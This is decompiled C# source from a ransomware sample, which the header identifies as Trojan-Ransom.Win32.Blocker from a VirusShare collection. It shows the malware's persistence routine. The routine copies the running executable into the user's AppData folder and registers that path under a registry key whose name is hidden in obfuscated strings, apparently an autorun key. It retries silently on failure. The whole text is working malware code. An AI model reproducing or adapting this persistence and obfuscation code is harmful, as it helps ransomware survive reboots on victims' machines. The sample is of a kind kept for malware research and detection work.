// Decompiled with JetBrains decompiler
// Type: DAStartup
// Assembly: ServerPHP, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 6F25B3EA-9C2B-406D-A5C7-3B7C6942C4C5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.kwu-cbd4f8ac3865079e515f22b836eb2d279bf8687da866b97896c91bd38f105d09.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

public class DAStartup
{
  public class Startupdll
  {
    public static string MyVAL = EHMIWRQ.VIJVUUV("dby8xLRSn73AtZe/Fg==", "False");
    public static string MYPTH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("hZG4ubqYt768vIUe", "False") + EHMIWRQ.VIJVUUV("csG7x7+Vs4XDyJYW", "False");

    public static void StartPers()
    {
      int num1 = 0;
      try
      {
        if (!File.Exists(DAStartup.Startupdll.MYPTH))
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, DAStartup.Startupdll.MYPTH, true);
      }
      catch (Exception ex)
      {
        int num2;
        int lErl = num2;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        int num3 = 1;
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(EHMIWRQ.VIJVUUV("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), true);
          registryKey.SetValue(DAStartup.Startupdll.MyVAL, (object) DAStartup.Startupdll.MYPTH);
          registryKey.Close();
          Thread.Sleep(5000);
          try
          {
            LOIFDUM.STRTTHRD.Abort();
            break;
          }
          catch (Exception ex)
          {
            int lErl = num3;
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
            break;
          }
        }
        catch (Exception ex1)
        {
          int lErl1 = num3;
          ProjectData.SetProjectError(ex1, lErl1);
          if (num1 == 3)
          {
            try
            {
              LOIFDUM.STRTTHRD.Abort();
            }
            catch (Exception ex2)
            {
              int lErl2 = num3;
              ProjectData.SetProjectError(ex2, lErl2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
            break;
          }
          checked { ++num1; }
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
